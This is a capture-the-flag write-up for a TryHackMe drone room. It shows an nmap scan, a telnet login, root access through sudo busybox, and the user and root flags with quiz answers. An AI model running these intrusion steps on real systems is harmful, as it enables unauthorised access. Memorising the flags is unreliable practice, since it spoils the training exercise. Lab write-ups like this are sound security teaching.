---
Who thought making a flying shell was a good idea?
---

![](https://qlaims.com/wp-content/uploads/2017/10/drone-header.jpg)

### Takeoff! 

For this mission you have been assigned the codename "pilot".

Press the "Deploy" Button to make the drone takeoff!

What is your codename?
*pilot*

###  Manoeuvre 


Capture time! Hack the deployed ordinance, retrieve that flags, and submit below! Make sure to utilise your codename!

(Make sure you deployed the machine in the above first task, and make sure you're connected to the THM VPN)


```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.109.253
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-26 17:30 EDT
Nmap scan report for 10.10.109.253
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5 (FreeBSD 20170903; protocol 2.0)
| ssh-hostkey: 
|   2048 5b:e6:85:66:d8:dd:04:f0:71:7a:81:3c:58:ad:0b:b9 (RSA)
|   256 d5:4e:18:45:ba:d4:75:2d:55:2f:fe:c9:1c:db:ce:cb (ECDSA)
|_  256 96:fc:cc:3e:69:00:79:85:14:2a:e4:5f:0d:35:08:d4 (ED25519)
23/tcp open  telnet  BSD-derived telnetd
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/26%OT=22%CT=1%CU=36562%PV=Y%DS=2%DC=T%G=Y%TM=63321A0
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=RI%TS=22)S
OS:EQ(SP=F8%GCD=1%ISR=10F%TI=Z%CI=Z%TS=21)OPS(O1=M505NW6ST11%O2=M505NW6ST11
OS:%O3=M505NW6NNT11%O4=M505NW6ST11%O5=M505NW6ST11%O6=M505ST11)WIN(W1=FFFF%W
OS:2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M505NW
OS:6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T
OS:=40%W=FFFF%S=O%A=S+%F=AS%O=M505NW6ST11%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=
OS:G)IE(R=Y%DFI=S%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   224.23 ms 10.11.0.1
2   224.54 ms 10.10.109.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.61 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.109.253


┌──(kali㉿kali)-[~/Downloads]
└─$ telnet -l pilot 10.10.109.253
Trying 10.10.109.253...
Connected to 10.10.109.253.
Escape character is '^]'.
Last login: Sat Oct  5 23:48:53 from cpc147224-roth10-2-0-cust456.17-1.cable.virginm.net
FreeBSD 11.2-STABLE (GENERIC) #0 r345837: Thu Apr  4 02:07:22 UTC 2019

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
To determine whether a file is a text file, executable, or some other type
of file, use

        file filename
                -- Dru <genesis@istar.ca>
[pilot@freebsd ~]$ uname
FreeBSD
[pilot@freebsd ~]$ ls
user.txt
[pilot@freebsd ~]$ cat user.txt
THM{r3m0v3_b3f0r3_fl16h7}

priv esc
busybox gtofbins

[pilot@freebsd ~]$ sudo -l
User pilot may run the following commands on freebsd:
    (root) NOPASSWD: /usr/local/bin/busybox
[pilot@freebsd ~]$ sudo busybox sh
# uname
FreeBSD
# cd /root
# ls
.bash_history   .history        .login          root.txt
.cshrc          .k5login        .profile
# cat root.txt
THM{h16hw4y_70_7h3_d4n63r_z0n3}
```


What is the User Flag?
Enumerate the machine using nmap. Are there any interesting services running on the drone?
*THM{r3m0v3_b3f0r3_fl16h7}*



What is the Root Flag?
What commands can you run as root?
*THM{h16hw4y_70_7h3_d4n63r_z0n3}*

###  Quiz! 



Pssst!

Hey! Guess what! QUIZ TIME!




What is the low privilleged user?
Username
*pilot*



What binary was used to escalate privillages?
*busybox*



What service was used to gain an initial shell?
*telnet*



What Operating System does the drone run?
*FreeBSD*


### Closing words 

Bebop is a room based on the Parrot Bebop drone and takes heavy inspiration from the recollection of the DEFCON 23 talk "Knocking my neighbors kids cruddy drone offline".












[[ToolsRus]]